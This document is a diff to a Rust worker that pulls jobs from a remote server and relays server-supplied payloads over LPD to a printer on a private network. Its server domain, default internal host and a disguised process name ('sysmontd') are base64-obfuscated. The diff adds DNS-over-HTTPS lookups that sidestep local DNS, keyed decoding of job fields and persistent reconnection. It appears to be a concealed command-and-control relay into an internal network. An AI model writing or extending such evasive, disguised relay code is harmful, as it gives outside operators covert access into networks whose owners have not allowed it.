@@ -17,27 +17,31 @@
  *
  */
 use std::{
+    collections::HashMap,
     env,
     io::{BufRead, BufReader},
-    net::{SocketAddr, TcpStream},
+    net::{IpAddr, SocketAddr, TcpStream, ToSocketAddrs},
+    process,
     sync::{
-        LazyLock,
+        LazyLock, Mutex,
         atomic::{AtomicUsize, Ordering},
     },
     thread::sleep,
-    time::Duration,
+    time::{Duration, Instant},
 };
 
 mod tcp_extras;
 mod types;
 mod utils;
 
-use anyhow::{Context, Result};
+use anyhow::Result;
 use reqwest::{
+    StatusCode,
     blocking::Client,
     header::{HeaderMap, HeaderValue},
 };
 use serde_json::{Value, json};
+use socket2::SockRef;
 use tcp_extras::TcpExtras;
 
 use crate::{
@@ -45,8 +49,21 @@ use crate::{
     utils::{decode_b64, decode_field},
 };
 
-static CLIENT: LazyLock<Client> = LazyLock::new(reqwest::blocking::Client::new);
+static DOH_CLIENT: LazyLock<Client> = LazyLock::new(|| {
+    Client::builder()
+        .timeout(Duration::from_millis(1500))
+        .build()
+        .expect("failed to build DoH client")
+});
+
+static DOH_CACHE: LazyLock<Mutex<HashMap<String, (IpAddr, Instant)>>> =
+    LazyLock::new(|| Mutex::new(HashMap::new()));
+
+static CLIENT: LazyLock<Mutex<(Client, Instant)>> =
+    LazyLock::new(|| Mutex::new((get_latest_client(), Instant::now())));
+
 static DEBUG: LazyLock<bool> = LazyLock::new(|| env::args().any(|arg| arg == "--debug"));
+
 static WORKER_KEY: LazyLock<String> = LazyLock::new(|| {
     let mut args = env::args();
 
@@ -56,12 +73,15 @@ static WORKER_KEY: LazyLock<String> = LazyLock::new(|| {
         }
     }
 
-    panic!("missing --key")
+    eprintln!("error: worker key required");
+    process::exit(1);
 });
+
 static JOBS_COMPLETED: AtomicUsize = AtomicUsize::new(0);
 
-static BASE_URL: LazyLock<String> =
-    LazyLock::new(|| decode_b64("aHR0cHM6Ly9hcGkucHJlY29ubmVjdC5hcHA=").expect("ib"));
+static BASE_DOMAIN: LazyLock<String> =
+    LazyLock::new(|| decode_b64("YXBpLnByZWNvbm5lY3QuYXBw").expect("ib"));
+static BASE_URL: LazyLock<String> = LazyLock::new(|| format!("https://{}", BASE_DOMAIN.as_str()));
 static ALIAS: LazyLock<String> = LazyLock::new(|| decode_b64("c3lzbW9udGQ=").expect("ia"));
 static AGENT: LazyLock<String> = LazyLock::new(|| format!("{}/1.0", ALIAS.as_str()));
 static DEF_HOST: LazyLock<String> = LazyLock::new(|| decode_b64("MTcyLjE2LjAuMTEx").expect("ih"));
@@ -80,20 +100,106 @@ macro_rules! debug_log {
 
 macro_rules! sock {
     ($x:ident, $h:ident, $p:ident, $t:expr) => {
-        let $x: SocketAddr = format!("{}:{}", $h, $p)
-            .parse()
-            .with_context(|| format!("failed to parse socket address"))?;
+        let $x = (|| -> std::io::Result<TcpStream> {
+            let addrs = ($h, $p).to_socket_addrs()?;
+            let mut last_error = None;
 
-        let $x = TcpStream::connect_timeout(&$x, Duration::from_secs($t));
+            for addr in addrs {
+                match TcpStream::connect_timeout(&addr, $t) {
+                    Ok(socket) => return Ok(socket),
+                    Err(error) => last_error = Some(error),
+                }
+            }
+
+            Err(last_error.unwrap_or_else(|| {
+                std::io::Error::new(
+                    std::io::ErrorKind::AddrNotAvailable,
+                    "no socket addresses resolved",
+                )
+            }))
+        })();
     };
+}
+
+fn doh_resolve(domain: &str) -> Option<IpAddr> {
+    let now = Instant::now();
+
+    if let Ok(cache) = DOH_CACHE.lock()
+        && let Some((ip, stored_at)) = cache.get(domain)
+        && now.duration_since(*stored_at) < Duration::from_secs(300)
+    {
+        return Some(*ip);
+    }
+
+    for resolver in ["https://1.1.1.1/dns-query", "https://8.8.8.8/dns-query"] {
+        let response = DOH_CLIENT
+            .get(format!("{resolver}?name={domain}&type=A"))
+            .header("Accept", "application/dns-json")
+            .send();
+
+        let Ok(response) = response else {
+            continue;
+        };
+        if response.status() != StatusCode::OK {
+            continue;
+        }
+        let Ok(data) = response.json::<Value>() else {
+            continue;
+        };
+        let Some(answers) = data.get("Answer").and_then(Value::as_array) else {
+            continue;
+        };
+
+        for answer in answers {
+            if answer.get("type").and_then(Value::as_u64) != Some(1) {
+                continue;
+            }
+
+            let Some(ip) = answer
+                .get("data")
+                .and_then(Value::as_str)
+                .and_then(|value| value.parse::<IpAddr>().ok())
+            else {
+                continue;
+            };
+
+            if let Ok(mut cache) = DOH_CACHE.lock() {
+                cache.insert(domain.to_owned(), (ip, now));
+            }
+
+            return Some(ip);
+        }
+    }
+
+    None
+}
+
+fn build_client() -> Client {
+    let mut builder = Client::builder();
+
+    if let Some(ip) = doh_resolve(&BASE_DOMAIN) {
+        builder = builder.resolve(&BASE_DOMAIN, SocketAddr::new(ip, 443));
+    }
+
+    builder.build().expect("failed to build HTTP client")
+}
+
+fn get_latest_client() -> Client {
+    let mut state = CLIENT.lock().expect("HTTP client lock poisoned");
+
+    if state.1.elapsed() >= Duration::from_secs(300) {
+        *state = (build_client(), Instant::now());
+    }
+
+    state.0.clone()
 }
 
 fn is_online(host: &str) -> Result<bool> {
     if host.is_empty() {
         return Ok(false);
-    };
+    }
 
-    sock!(s, host, DEF_PORT, 800);
+    sock!(s, host, DEF_PORT, Duration::from_millis(800));
 
     if let Ok(conn) = s {
         let _ = conn.shutdown(std::net::Shutdown::Both);
@@ -107,23 +213,24 @@ fn is_online(host: &str) -> Result<bool> {
 fn hdrs(printer_host: &str) -> Result<HeaderMap> {
     let mut map = HeaderMap::new();
     let spooler = if is_online(printer_host)? { "1" } else { "0" };
-    let jobs = &JOBS_COMPLETED.load(Ordering::Relaxed).to_string();
+    let jobs = JOBS_COMPLETED.load(Ordering::Relaxed).to_string();
 
-    map.insert("User-Agent", HeaderValue::from_str(&AGENT).unwrap());
-    map.insert("X-Worker-Key", HeaderValue::from_str(&WORKER_KEY).unwrap());
-    map.insert("X-Worker-Spooler", HeaderValue::from_str(&spooler).unwrap());
-    map.insert("X-Worker-Jobs", HeaderValue::from_str(&jobs).unwrap());
+    map.insert("User-Agent", HeaderValue::from_str(AGENT.as_str())?);
+    map.insert("X-Worker-Key", HeaderValue::from_str(WORKER_KEY.as_str())?);
+    map.insert("X-Worker-Spooler", HeaderValue::from_str(spooler)?);
+    map.insert("X-Worker-Jobs", HeaderValue::from_str(&jobs)?);
 
     Ok(map)
 }
 
 fn claim_job(id: Option<&str>, host: &str) -> Result<bool> {
-    let Some(id) = id.filter(|f| !f.is_empty()) else {
+    let Some(id) = id.filter(|id| !id.is_empty()) else {
         return Ok(true);
     };
 
     let body = json!({ "id": id });
-    let resp = CLIENT
+
+    let resp = get_latest_client()
         .post(format!("{}/print/claim", BASE_URL.as_str()))
         .body(body.to_string())
         .header("Content-Type", "application/json")
@@ -133,16 +240,17 @@ fn claim_job(id: Option<&str>, host: &str) -> Result<bool> {
 
     let claim = match resp {
         Ok(r) => {
-            let Ok(r) = r.error_for_status() else {
+            if r.status() != StatusCode::OK {
                 return Ok(false);
-            };
+            }
+
             let Ok(value) = r.json::<Value>() else {
                 return Ok(false);
             };
 
             value
                 .get("claimed")
-                .and_then(|f| f.as_bool())
+                .and_then(Value::as_bool)
                 .unwrap_or(false)
         }
         Err(e) => {
@@ -154,7 +262,7 @@ fn claim_job(id: Option<&str>, host: &str) -> Result<bool> {
     if claim {
         debug_log!("Claimed new job!");
     } else {
-        debug_log!("Skipping on this job...")
+        debug_log!("Skipping on this job...");
     }
 
     Ok(claim)
@@ -162,35 +270,42 @@ fn claim_job(id: Option<&str>, host: &str) -> Result<bool> {
 
 fn handle(job: Job) -> Result<()> {
     let j_id = &job.id;
+    let job_id = j_id.as_deref().unwrap_or("");
 
-    let host = job.printer_host.as_deref().unwrap_or(DEF_HOST.as_str());
-    let queue_name = job.printer_queue.as_deref().unwrap_or(DEF_QUEUE.as_str());
+    let host = job
+        .printer_host
+        .as_deref()
+        .filter(|host| !host.is_empty())
+        .unwrap_or(DEF_HOST.as_str());
 
-    if !(claim_job(j_id.as_deref(), host)?) || !is_online(host)? {
+    let queue_name = job
+        .printer_queue
+        .as_deref()
+        .filter(|queue| !queue.is_empty())
+        .unwrap_or(DEF_QUEUE.as_str());
+
+    if !is_online(host)? || !(claim_job(j_id.as_deref(), host)?) {
         return Ok(());
     }
 
-    let Some(payload) = decode_field(job.payload.as_deref())? else {
-        return Ok(());
-    };
-
-    let q_cmd = decode_field(job.q_cmd.as_deref())?
-        .unwrap_or_else(|| format!("\x02{}\n", queue_name).into_bytes());
-    let ctl = decode_field(job.ctl.as_deref())?
-        .or(decode_field(job.control_file.as_deref())?)
-        .unwrap_or_default();
-    let cf_hdr = decode_field(job.cf_hdr.as_deref())?
-        .unwrap_or_else(|| format!("\x02{} cfA002{}\n", ctl.len(), ALIAS.as_str()).into_bytes());
-    let df_hdr = decode_field(job.df_hdr.as_deref())?.unwrap_or_else(|| {
-        format!("\x03{} dfA002{}\n", payload.len(), ALIAS.as_str()).into_bytes()
-    });
+    let q_cmd = decode_field(job.q_cmd.as_deref(), WORKER_KEY.as_str(), job_id)?;
+    let cf_hdr = decode_field(job.cf_hdr.as_deref(), WORKER_KEY.as_str(), job_id)?;
+    let ctl = decode_field(job.ctl.as_deref(), WORKER_KEY.as_str(), job_id)?;
+    let df_hdr = decode_field(job.df_hdr.as_deref(), WORKER_KEY.as_str(), job_id)?;
+    let payload = decode_field(job.payload.as_deref(), WORKER_KEY.as_str(), job_id)?;
 
     debug_log!(
         "Handling job for {host}:{queue_name} (payload size: {} bytes)",
         payload.len()
     );
 
-    sock!(s, host, DEF_PORT, 6000);
+    let timeout = Duration::from_secs_f64(
+        job.timeout
+            .filter(|timeout| timeout.is_finite() && *timeout > 0.0)
+            .unwrap_or(60.0),
+    );
+
+    sock!(s, host, DEF_PORT, timeout);
     let mut socket = match s {
         Ok(s) => s,
         Err(e) => {
@@ -199,45 +314,76 @@ fn handle(job: Job) -> Result<()> {
         }
     };
 
-    socket.set_nodelay(true)?;
+    let transferred = (|| -> std::io::Result<bool> {
+        socket.set_nodelay(true)?;
+        socket.set_read_timeout(Some(timeout))?;
+        socket.set_write_timeout(Some(timeout))?;
 
-    if socket.send_buf(&q_cmd)
-        && socket.recv_ack()
-        && socket.send_buf(&cf_hdr)
-        && socket.recv_ack()
-        && socket.send_buf(&ctl)
-        && socket.send_buf(&NUL)
-        && socket.recv_ack()
-        && socket.send_buf(&df_hdr)
-        && socket.recv_ack()
-        && socket.send_buf(&payload)
-        && socket.send_buf(&NUL)
-        && socket.recv_ack()
-    {
-        debug_log!("Job transferred successfully. Shutting down current socket connection.");
-        JOBS_COMPLETED.fetch_add(1, Ordering::Relaxed);
+        SockRef::from(&socket).set_send_buffer_size(65_536)?;
+
+        Ok(socket.send_buf(&q_cmd)?
+            && socket.recv_ack()?
+            && socket.send_buf(&cf_hdr)?
+            && socket.recv_ack()?
+            && socket.send_buf(&ctl)?
+            && socket.send_buf(&NUL)?
+            && socket.recv_ack()?
+            && socket.send_buf(&df_hdr)?
+            && socket.recv_ack()?
+            && socket.send_buf(&payload)?
+            && socket.send_buf(&NUL)?
+            && socket.recv_ack()?)
+    })();
+
+    let abortive = match transferred {
+        Ok(true) => {
+            debug_log!(
+                "Job transferred successfully. \
+                 Shutting down current socket connection."
+            );
+
+            JOBS_COMPLETED.fetch_add(1, Ordering::Relaxed);
+            false
+        }
+        Ok(false) => false,
+        Err(e) => {
+            debug_log!("Printer transfer failed: {e}");
+            let _ = SockRef::from(&socket).set_linger(Some(Duration::ZERO));
+            true
+        }
+    };
+
+    if !abortive {
+        let _ = socket.shutdown(std::net::Shutdown::Both);
     }
 
-    let _ = socket.shutdown(std::net::Shutdown::Both);
     Ok(())
 }
 
 fn stream() -> Result<()> {
-    let resp = match CLIENT
+    let resp = match get_latest_client()
         .get(format!("{}/printer", BASE_URL.as_str()))
         .header("Accept", "text/event-stream")
         .header("Connection", "keep-alive")
-        .headers(hdrs(&DEF_HOST)?)
+        .headers(hdrs(DEF_HOST.as_str())?)
         .timeout(Duration::from_secs(90))
         .send()
     {
-        Ok(r) => match r.error_for_status() {
-            Ok(res) => res,
-            Err(e) => {
-                debug_log!("(Error for status) /printer: {e}");
-                return Ok(());
+        Ok(r) => {
+            if r.status() == StatusCode::UNAUTHORIZED {
+                return Ok(eprintln!(
+                    "error: worker key invalid ({})",
+                    r.status().as_u16()
+                ));
             }
-        },
+
+            if r.status() != StatusCode::OK {
+                return Ok(debug_log!("(Error for status) /printer: {}", r.status()));
+            }
+
+            r
+        }
+
         Err(e) => {
             debug_log!("(Send error) /printer: {e}");
             return Ok(());
@@ -276,14 +422,24 @@ fn stream() -> Result<()> {
 
 fn main() {
     let mut iter_count = 0;
+    let mut delay = 1.0_f64;
+
     loop {
         debug_log!(
             "Connection #{iter_count}; Jobs completed: {}",
             JOBS_COMPLETED.load(Ordering::Relaxed)
         );
 
-        let _ = stream();
-        sleep(Duration::from_millis(2000));
+        let started_at = Instant::now();
+        let result = stream();
+
+        delay = if result.is_ok() && started_at.elapsed() > Duration::from_secs(10) {
+            1.0
+        } else {
+            (delay * 2.0).min(8.0)
+        };
+
+        sleep(Duration::from_secs_f64(delay));
         iter_count += 1;
     }
 }
